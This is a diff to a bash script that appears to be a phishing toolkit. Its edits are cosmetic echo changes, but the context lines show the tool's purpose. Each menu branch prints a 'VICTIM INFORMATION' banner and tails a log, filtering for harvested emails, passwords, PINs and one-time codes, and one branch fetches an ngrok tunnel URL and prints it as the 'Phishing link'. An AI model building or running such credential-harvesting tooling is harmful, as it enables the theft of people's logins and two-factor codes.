@@ -125,7 +125,7 @@ ash() {
 			    echo " "
 			    sleep 2
 			    echo -e "\e[96m<<<<<<<<<<<<<<<<<<<<<<<\e[92m VICTIM INFORMATION \e[96m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>  \e[93m"  
-			    echo "" 
+			    echo 
 			    tail -f log.txt | grep -e "email" -e "pass" -e "approvals_code"
 	
                             break;
@@ -151,7 +151,7 @@ ash() {
 			   echo " "
 			   sleep 2
                            echo -e "\e[96m<<<<<<<<<<<<<<<<<<<<<<<\e[92m VICTIM INFORMATION \e[96m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>  \e[93m"
-                           echo ""
+                           echo 
                            tail -f log.txt | grep -e "id" -e "password"      
 
                            break;
@@ -177,6 +177,7 @@ ash() {
 			   echo " "
 			   sleep 2
 			   echo -e "\e[96m<<<<<<<<<<<<<<<<<<<<<<<\e[92m VICTIM INFORMATION \e[96m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>  \e[93m"
+			   echo
 			   tail -f log.txt
 			   
                            break;
@@ -202,6 +203,7 @@ ash() {
 			  echo " "
 			  sleep 2
 			  echo -e "\e[96m<<<<<<<<<<<<<<<<<<<<<<<\e[92m VICTIM INFORMATION \e[96m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>  \e[93m"
+			  echo
 			  tail -f log.txt | grep -e "Email_or_Phone" -e "password" -e "verificationCode"
 
                           break;
@@ -227,6 +229,7 @@ ash() {
 			  echo " "
 			  sleep 2
 		          echo -e "\e[96m<<<<<<<<<<<<<<<<<<<<<<<\e[92m VICTIM INFORMATION \e[96m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>  \e[93m"
+			  echo
 		          tail -f log.txt | grep -e "number" -e "otp" -e "OTP"
 
                           break;
@@ -252,6 +255,7 @@ ash() {
 		          echo " "
 			  sleep 2
 		          echo -e "\e[96m<<<<<<<<<<<<<<<<<<<<<<<\e[92m VICTIM INFORMATION \e[96m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>  \e[93m"
+			  echo
 		          tail -f log.txt | grep -e "email" -e "password" -e "OTP"
   
                           break;
@@ -286,7 +290,7 @@ ash() {
 			        echo " "
 			        sleep 2
                                 echo -e "\e[96m<<<<<<<<<<<<<<<<<<<<<<<\e[92m VICTIM INFORMATION \e[96m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>  \e[93m"
-                                echo ""
+                                echo 
                                 tail -f log.txt | grep -e "email" -e "username" -e "password" -e "otp"
 		
 	                	else
@@ -309,7 +313,7 @@ ash() {
 			        echo " "
 				sleep 2
                                 echo -e "\e[96m<<<<<<<<<<<<<<<<<<<<<<<\e[92m VICTIM INFORMATION \e[96m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>  \e[93m"
-                                echo ""
+                                echo 
                                 tail -f log.txt | grep -e "email" -e "loginPassword" -e "mobileNumber" -e "otp"
 				fi
                                 
@@ -337,7 +341,7 @@ ash() {
 			  echo " "
 			  sleep 2
                           echo -e "\e[96m<<<<<<<<<<<<<<<<<<<<<<<\e[92m VICTIM INFORMATION \e[96m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>  \e[93m"
-                          echo ""
+                          echo 
                           tail -f log.txt | grep -e "userLoginId" -e "password" -e "OTP"                 
 
                           break;
@@ -363,7 +367,7 @@ ash() {
 			   echo " "
 			   sleep 2
                            echo -e "\e[96m<<<<<<<<<<<<<<<<<<<<<<<\e[92m VICTIM INFORMATION \e[96m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>  \e[93m"
-                           echo ""
+                           echo 
                            tail -f log.txt | grep -e "username" -e "password" -e "password" -e "pin" -e "Pin"                        
 
                            break;
@@ -383,13 +387,13 @@ ash() {
                            echo ""
                            link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
                            printf "\e[31m[\e[32m*\e[31m]\e[33m Your Phishing link :\e[0m\e[32m %s\e[0m\n" $link
-                           echo ""
+                           echo 
 		           ash
-		           echo " "
-			   echo " "
+		           echo 
+			   echo 
 			   sleep 2
                            echo -e "\e[96m<<<<<<<<<<<<<<<<<<<<<<<\e[92m VICTIM INFORMATION \e[96m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>  \e[93m"
-                           echo ""
+                           echo 
                            tail -f log.txt | grep -e "email" -e "password" -e "OTP"  
 
                            break;
@@ -415,7 +419,7 @@ ash() {
 			   echo " "
 			   sleep 2
                            echo -e "\e[96m<<<<<<<<<<<<<<<<<<<<<<<\e[92m VICTIM INFORMATION \e[96m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>  \e[93m"
-                           echo ""
+                           echo 
                            tail -f log.txt | grep -e "number" -e "OTP" -e "otp"      
 
                            break;
@@ -441,7 +445,7 @@ ash() {
 			   echo " "
 			   sleep 2
                            echo -e "\e[96m<<<<<<<<<<<<<<<<<<<<<<<\e[92m VICTIM INFORMATION \e[96m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>  \e[93m"
-                           echo ""
+                           echo 
                            tail -f log.txt | grep -e "email" -e "Email" -e "password" -e "pin" -e "Pin"       
 
                            break;
@@ -467,7 +471,7 @@ ash() {
 			   echo " "
 			   sleep 2
                            echo -e "\e[96m<<<<<<<<<<<<<<<<<<<<<<<\e[92m VICTIM INFORMATION \e[96m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>  \e[93m"
-                           echo ""
+                           echo 
                            tail -f log.txt | grep -e "phoneNo" -e "OTP"       
 
                            break;
@@ -493,7 +497,7 @@ ash() {
 			   echo " "
 			   sleep 2
                            echo -e "\e[96m<<<<<<<<<<<<<<<<<<<<<<<\e[92m VICTIM INFORMATION \e[96m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>  \e[93m"
-                           echo ""
+                           echo 
                            tail -f log.txt | grep -e "username" -e "password" -e "password" -e "pin" -e "Pin"        
 
                            break;
@@ -517,7 +521,7 @@ ash() {
 	                   ash
 		           echo " "
                            echo -e "\e[96m<<<<<<<<<<<<<<<<<<<<<<<\e[92m VICTIM INFORMATION \e[96m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>  \e[93m"
-                           echo ""
+                           echo 
                            tail -f log.txt | grep -e "login" -e "password" -e "otp"       
 
                            break;
@@ -543,7 +547,7 @@ ash() {
 			   echo " "
 			   sleep 2
                            echo -e "\e[96m<<<<<<<<<<<<<<<<<<<<<<<\e[92m VICTIM INFORMATION \e[96m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>  \e[93m"
-                           echo ""
+                           echo 
                            tail -f ip.txt        
 
                            break;
@@ -569,7 +573,7 @@ ash() {
 			   echo " "
 			   sleep 2
                            echo -e "\e[96m<<<<<<<<<<<<<<<<<<<<<<<\e[92m VICTIM INFORMATION \e[96m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>  \e[93m"
-                           echo ""
+                           echo 
                            tail -f log.txt | grep -e "email" -e "otp" -e "OTP"                
 
                            break;
@@ -595,7 +599,7 @@ ash() {
 			   echo " "
 			   sleep 2
                            echo -e "\e[96m<<<<<<<<<<<<<<<<<<<<<<<\e[92m VICTIM INFORMATION \e[96m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>  \e[93m"
-                           echo ""
+                           echo 
                            tail -f log.txt | grep -e "number" -e "otp"                       
 
                            break;
@@ -621,7 +625,7 @@ ash() {
 			   echo " "
 			   sleep 2
                            echo -e "\e[96m<<<<<<<<<<<<<<<<<<<<<<<\e[92m VICTIM INFORMATION \e[96m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>  \e[93m"
-                           echo ""
+                           echo 
                            tail -f log.txt | grep -e "login_email" -e "login_password" -e "otpCode"    
 
                            break;
@@ -647,7 +651,7 @@ ash() {
 			   echo " "
 			   sleep 2
 		           echo -e "\e[96m<<<<<<<<<<<<<<<<<<<<<<<\e[92m VICTIM INFORMATION \e[96m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>  \e[93m"
-                           echo ""
+                           echo 
                            tail -f log.txt | grep -e "phone_number" -e "phone_code"     
 
                            break;
@@ -673,7 +677,7 @@ ash() {
 			   echo " "
 			   sleep 2
                            echo -e "\e[96m<<<<<<<<<<<<<<<<<<<<<<<\e[92m VICTIM INFORMATION \e[96m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>  \e[93m"
-                           echo ""
+                           echo 
                            tail -f log.txt | grep -e "phone_or_email" -e "password" -e "challenge_response"      
 
                            break;
@@ -699,7 +703,7 @@ ash() {
 			  echo " "
 			  sleep 2
                           echo -e "\e[96m<<<<<<<<<<<<<<<<<<<<<<<\e[92m VICTIM INFORMATION \e[96m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>  \e[93m"
-                          echo ""
+                          echo 
                           tail -f log.txt | grep -e "email" -e "password" -e "otp"     
 
                           break;
@@ -725,7 +729,7 @@ ash() {
 			  echo " "
 			  sleep 2
                           echo -e "\e[96m<<<<<<<<<<<<<<<<<<<<<<<\e[92m VICTIM INFORMATION \e[96m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>  \e[93m"
-                          echo ""
+                          echo 
                           tail -f log.txt | grep -e "log" -e "pwd"       
 
                           break;
@@ -751,7 +755,7 @@ ash() {
 			   echo " "
 			   sleep 2
                            echo -e "\e[96m<<<<<<<<<<<<<<<<<<<<<<<\e[92m VICTIM INFORMATION \e[96m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>  \e[93m"
-                           echo ""
+                           echo 
                            tail -f log.txt | grep -e "username" -e "password" -e "Code"       
 
                            break;
@@ -777,7 +781,7 @@ ash() {
 			   echo " "
 			   sleep 2
                            echo -e "\e[96m<<<<<<<<<<<<<<<<<<<<<<<\e[92m VICTIM INFORMATION \e[96m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>  \e[93m"
-                           echo ""
+                           echo 
                            tail -f log.txt | grep -e "username" -e "password"   
 
                            break;
@@ -803,7 +807,7 @@ ash() {
 			   echo " "
 			   sleep 2
                            echo -e "\e[96m<<<<<<<<<<<<<<<<<<<<<<<\e[92m VICTIM INFORMATION \e[96m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>  \e[93m"
-                           echo ""
+                           echo 
                            tail -f log.txt | grep -e "email" -e "password"                 
 
                            break;
@@ -829,7 +833,7 @@ ash() {
 			   echo " "
 			   sleep 2
                            echo -e "\e[96m<<<<<<<<<<<<<<<<<<<<<<<\e[92m VICTIM INFORMATION \e[96m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>  \e[93m"
-                           echo ""
+                           echo 
                            tail -f log.txt | grep -e "userid" -e "pass" -e "pin"                       
 
                            break;
@@ -855,7 +859,7 @@ ash() {
 			   echo " "
 			   sleep 2
                            echo -e "\e[96m<<<<<<<<<<<<<<<<<<<<<<<\e[92m VICTIM INFORMATION \e[96m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>  \e[93m"
-                           echo ""
+                           echo 
                            tail -f log.txt | grep -e "Username" -e "password" -e "otp"  
 
                            break;
@@ -881,7 +885,7 @@ ash() {
 			   echo " "
 			   sleep 2
                            echo -e "\e[96m<<<<<<<<<<<<<<<<<<<<<<<\e[92m VICTIM INFORMATION \e[96m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>  \e[93m"
-                           echo ""
+                           echo 
                            tail -f log.txt | grep -e "username" -e "password"    
 
                            break;
@@ -907,7 +911,7 @@ ash() {
 			   echo " "
 			   sleep 2
                            echo -e "\e[96m<<<<<<<<<<<<<<<<<<<<<<<\e[92m VICTIM INFORMATION \e[96m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>  \e[93m"
-                           echo ""
+                           echo 
                            tail -f log.txt | grep -e "email" -e "password"     
 
                            break;
@@ -933,7 +937,7 @@ ash() {
 			   echo " "
 			   sleep 2
                            echo -e "\e[96m<<<<<<<<<<<<<<<<<<<<<<<\e[92m VICTIM INFORMATION \e[96m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>  \e[93m"
-                           echo ""
+                           echo
                            tail -f log.txt | grep -e "userId" -e "otp"     
 
                            break;
